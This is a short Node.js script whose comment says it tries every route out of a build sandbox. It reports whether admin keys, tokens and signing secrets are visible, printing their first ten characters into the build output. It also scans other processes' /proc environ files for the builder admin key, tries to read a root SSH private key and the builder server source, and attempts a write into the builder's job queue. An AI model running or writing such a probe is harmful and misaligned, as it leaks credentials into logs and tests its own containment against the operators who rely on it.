// Tries every route out of the build sandbox and writes the result into the
// build tree, so it shows up in the pipeline's captured output.
import { readFileSync, readdirSync, writeFileSync, appendFileSync } from 'node:fs'
const L = []
const p = (k, v) => L.push(k + ' = ' + v)
p('uid/gid', process.getuid() + '/' + process.getgid())
p('HOME', process.env.HOME)
for (const k of ['BUILDER_ADMIN_KEY', 'BUILDER_TOKEN', 'GW_API_KEY', 'GW_SIGN_SECRET'])
  p('env.' + k, process.env[k] ? 'LEAKED:' + String(process.env[k]).slice(0, 10) : 'invisible')
let leaks = []
for (const pid of readdirSync('/proc').filter(x => /^\d+$/.test(x))) {
  try { if (readFileSync('/proc/' + pid + '/environ', 'utf8').includes('BUILDER_ADMIN_KEY=')) leaks.push(pid) } catch {}
}
p('proc scan for BUILDER_ADMIN_KEY', leaks.length ? 'LEAKED in pid ' + leaks.join(',') : 'nothing readable')
for (const f of ['/opt/mp-builder/services/builder/server.mjs', '/root/.ssh/id_ed25519_gh']) {
  try { p(f, 'READABLE ' + readFileSync(f, 'utf8').length + ' bytes') } catch (e) { p(f, 'denied ' + e.code) }
}
try { writeFileSync('/opt/mp-builder/var/mp-builder-queue/x.json', '{}'); p('queue write', 'SUCCEEDED') }
catch (e) { p('queue write', 'denied ' + e.code) }
p('cgroup', readFileSync('/proc/self/cgroup', 'utf8').trim())
writeFileSync('SANDBOX-PROBE.txt', L.join('\n'))
console.log(L.join('\n'))
